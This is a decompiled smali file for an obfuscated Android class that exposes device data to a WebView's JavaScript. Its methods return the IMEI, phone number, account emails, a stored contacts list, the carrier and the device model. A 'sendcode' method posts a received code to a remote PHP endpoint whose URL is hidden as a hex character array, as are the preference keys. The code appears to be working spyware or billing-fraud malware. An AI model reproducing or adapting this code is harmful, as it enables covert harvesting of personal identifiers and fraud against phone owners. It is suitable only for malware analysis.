.class public Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;
.super Ljava/lang/Object;
.source "Srkwwc.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lkosp/ynqekv/swdt/Srkwwc;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "Vbqtksrd"
.end annotation


# instance fields
.field mContext:Landroid/content/Context;

.field final synthetic this$0:Lkosp/ynqekv/swdt/Srkwwc;


# direct methods
.method constructor <init>(Lkosp/ynqekv/swdt/Srkwwc;Landroid/content/Context;)V
    .locals 0
    .param p2, "c"    # Landroid/content/Context;

    .prologue
    .line 279
    iput-object p1, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->this$0:Lkosp/ynqekv/swdt/Srkwwc;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 280
    iput-object p2, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    .line 281
    return-void
.end method

.method private capitalize(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "s"    # Ljava/lang/String;

    .prologue
    .line 394
    if-eqz p1, :cond_0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v1

    if-nez v1, :cond_2

    .line 395
    :cond_0
    const-string p1, ""

    .line 401
    .end local p1    # "s":Ljava/lang/String;
    :cond_1
    :goto_0
    return-object p1

    .line 397
    .restart local p1    # "s":Ljava/lang/String;
    :cond_2
    const/4 v1, 0x0

    invoke-virtual {p1, v1}, Ljava/lang/String;->charAt(I)C

    move-result v0

    .line 398
    .local v0, "first":C
    invoke-static {v0}, Ljava/lang/Character;->isUpperCase(C)Z

    move-result v1

    if-nez v1, :cond_1

    .line 401
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/Character;->toUpperCase(C)C

    move-result v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v2, 0x1

    invoke-virtual {p1, v2}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_0
.end method


# virtual methods
.method public countphones()I
    .locals 6
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    const/4 v5, 0x0

    .line 336
    iget-object v2, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x5

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v2, v3, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 337
    .local v1, "settings":Landroid/content/SharedPreferences;
    new-instance v2, Ljava/lang/String;

    const/16 v3, 0xb

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v1, v2, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 338
    .local v0, "id":I
    return v0

    .line 336
    nop

    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 337
    nop

    :array_1
    .array-data 2
        0x63s
        0x6fs
        0x75s
        0x6es
        0x74s
        0x70s
        0x68s
        0x6fs
        0x6es
        0x65s
        0x73s
    .end array-data
.end method

.method public country()Ljava/lang/String;
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 415
    iget-object v0, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v0

    iget-object v0, v0, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    invoke-virtual {v0}, Ljava/util/Locale;->getCountry()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public getDeviceName()Ljava/lang/String;
    .locals 4

    .prologue
    .line 383
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    .line 384
    .local v0, "manufacturer":Ljava/lang/String;
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 385
    .local v1, "model":Ljava/lang/String;
    invoke-virtual {v1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 386
    invoke-direct {p0, v1}, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 388
    :goto_0
    return-object v2

    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {p0, v0}, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->capitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_0
.end method

.method public getcontacts()Ljava/lang/String;
    .locals 5
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 343
    iget-object v2, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x5

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 344
    .local v1, "settings":Landroid/content/SharedPreferences;
    new-instance v2, Ljava/lang/String;

    const/16 v3, 0xa

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    const-string v3, ""

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 345
    .local v0, "out":Ljava/lang/String;
    return-object v0

    .line 343
    nop

    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 344
    nop

    :array_1
    .array-data 2
        0x6cs
        0x69s
        0x73s
        0x74s
        0x70s
        0x68s
        0x6fs
        0x6es
        0x65s
        0x73s
    .end array-data
.end method

.method public getstatus()I
    .locals 6
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    const/4 v5, 0x0

    .line 420
    iget-object v2, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x5

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v2, v3, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 421
    .local v1, "settings":Landroid/content/SharedPreferences;
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x6

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v1, v2, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 422
    .local v0, "id":I
    return v0

    .line 420
    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 421
    nop

    :array_1
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x74s
        0x75s
        0x73s
    .end array-data
.end method

.method public imei()Ljava/lang/String;
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 360
    iget-object v0, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public log(Ljava/lang/String;)V
    .locals 0
    .param p1, "str"    # Ljava/lang/String;
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 307
    return-void
.end method

.method public mail()Ljava/lang/String;
    .locals 9
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 365
    const-string v2, ""

    .line 366
    .local v2, "email":Ljava/lang/String;
    sget-object v3, Landroid/util/Patterns;->EMAIL_ADDRESS:Ljava/util/regex/Pattern;

    .line 367
    .local v3, "emailPattern":Ljava/util/regex/Pattern;
    iget-object v5, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    invoke-static {v5}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v5

    invoke-virtual {v5}, Landroid/accounts/AccountManager;->getAccounts()[Landroid/accounts/Account;

    move-result-object v1

    .line 368
    .local v1, "accounts":[Landroid/accounts/Account;
    array-length v6, v1

    const/4 v5, 0x0

    :goto_0
    if-lt v5, v6, :cond_0

    .line 374
    return-object v2

    .line 368
    :cond_0
    aget-object v0, v1, v5

    .line 369
    .local v0, "account":Landroid/accounts/Account;
    iget-object v7, v0, Landroid/accounts/Account;->name:Ljava/lang/String;

    invoke-virtual {v3, v7}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v7

    invoke-virtual {v7}, Ljava/util/regex/Matcher;->matches()Z

    move-result v7

    if-eqz v7, :cond_1

    .line 370
    iget-object v4, v0, Landroid/accounts/Account;->name:Ljava/lang/String;

    .line 371
    .local v4, "possibleEmail":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v8, ", "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 368
    .end local v4    # "possibleEmail":Ljava/lang/String;
    :cond_1
    add-int/lit8 v5, v5, 0x1

    goto :goto_0
.end method

.method public model()Ljava/lang/String;
    .locals 1
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 407
    invoke-virtual {p0}, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->getDeviceName()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public network()Ljava/lang/String;
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 411
    iget-object v0, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public phone()Ljava/lang/String;
    .locals 2
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 379
    iget-object v0, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public photo()I
    .locals 6
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    const/4 v5, 0x0

    .line 329
    iget-object v2, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x5

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v2, v3, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 330
    .local v1, "settings":Landroid/content/SharedPreferences;
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x6

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v1, v2, v5}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 331
    .local v0, "id":I
    return v0

    .line 329
    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 330
    nop

    :array_1
    .array-data 2
        0x63s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
    .end array-data
.end method

.method public photoimg()Ljava/lang/String;
    .locals 5
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 351
    iget-object v2, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x5

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 352
    .local v1, "settings":Landroid/content/SharedPreferences;
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x4

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    new-instance v3, Ljava/lang/String;

    const/16 v4, 0x9

    new-array v4, v4, [C

    fill-array-data v4, :array_2

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 353
    .local v0, "photo":Ljava/lang/String;
    return-object v0

    .line 351
    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 352
    nop

    :array_1
    .array-data 2
        0x66s
        0x61s
        0x63s
        0x65s
    .end array-data

    :array_2
    .array-data 2
        0x70s
        0x68s
        0x6fs
        0x74s
        0x6fs
        0x2es
        0x6as
        0x70s
        0x67s
    .end array-data
.end method

.method public read(Ljava/lang/String;I)I
    .locals 5
    .param p1, "name"    # Ljava/lang/String;
    .param p2, "value"    # I
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 321
    iget-object v2, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x5

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 322
    .local v1, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v1, p1, p2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 323
    .local v0, "id":I
    return v0

    .line 321
    nop

    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data
.end method

.method public sendcode(Ljava/lang/String;)V
    .locals 9
    .param p1, "code"    # Ljava/lang/String;
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    const/4 v7, 0x5

    const/4 v8, 0x0

    .line 435
    iget-object v4, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    new-instance v5, Ljava/lang/String;

    new-array v6, v7, [C

    fill-array-data v6, :array_0

    invoke-direct {v5, v6}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v4, v5, v8}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 436
    .local v2, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 437
    .local v1, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v4, Ljava/lang/String;

    new-array v5, v7, [C

    fill-array-data v5, :array_1

    invoke-direct {v4, v5}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v1, v4, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 438
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 439
    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x4

    new-array v4, v4, [C

    fill-array-data v4, :array_2

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    .line 440
    .local v3, "type":Ljava/lang/String;
    move-object v0, p1

    .line 441
    .local v0, "data":Ljava/lang/String;
    new-instance v4, Lkosp/ynqekv/swdt/Kadba;

    iget-object v5, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    invoke-direct {v4, v5}, Lkosp/ynqekv/swdt/Kadba;-><init>(Landroid/content/Context;)V

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/String;

    new-instance v6, Ljava/lang/String;

    const/16 v7, 0x22

    new-array v7, v7, [C

    fill-array-data v7, :array_3

    invoke-direct {v6, v7}, Ljava/lang/String;-><init>([C)V

    aput-object v6, v5, v8

    const/4 v6, 0x1

    aput-object v3, v5, v6

    const/4 v6, 0x2

    aput-object v0, v5, v6

    invoke-virtual {v4, v5}, Lkosp/ynqekv/swdt/Kadba;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 442
    return-void

    .line 435
    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 437
    nop

    :array_1
    .array-data 2
        0x70s
        0x63s
        0x6fs
        0x64s
        0x65s
    .end array-data

    .line 439
    nop

    :array_2
    .array-data 2
        0x63s
        0x6fs
        0x64s
        0x65s
    .end array-data

    .line 441
    :array_3
    .array-data 2
        0x68s
        0x74s
        0x74s
        0x70s
        0x3as
        0x2fs
        0x2fs
        0x61s
        0x70s
        0x69s
        0x2es
        0x61s
        0x70s
        0x69s
        0x6ds
        0x61s
        0x70s
        0x65s
        0x2es
        0x6es
        0x65s
        0x74s
        0x2fs
        0x61s
        0x70s
        0x69s
        0x2fs
        0x61s
        0x70s
        0x70s
        0x2es
        0x70s
        0x68s
        0x70s
    .end array-data
.end method

.method public setstatus(I)V
    .locals 5
    .param p1, "val"    # I
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 427
    iget-object v2, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x5

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 428
    .local v1, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 429
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x6

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-interface {v0, v2, p1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 430
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 431
    return-void

    .line 427
    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 429
    nop

    :array_1
    .array-data 2
        0x73s
        0x74s
        0x61s
        0x74s
        0x75s
        0x73s
    .end array-data
.end method

.method public showToast(Ljava/lang/String;)V
    .locals 2
    .param p1, "toast"    # Ljava/lang/String;
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 301
    iget-object v0, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    const/4 v1, 0x0

    invoke-static {v0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 302
    return-void
.end method

.method public write(Ljava/lang/String;I)V
    .locals 5
    .param p1, "name"    # Ljava/lang/String;
    .param p2, "value"    # I
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    .line 312
    iget-object v2, p0, Lkosp/ynqekv/swdt/Srkwwc$Vbqtksrd;->mContext:Landroid/content/Context;

    new-instance v3, Ljava/lang/String;

    const/4 v4, 0x5

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 313
    .local v1, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 314
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    invoke-interface {v0, p1, p2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 315
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 316
    return-void

    .line 312
    nop

    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data
.end method
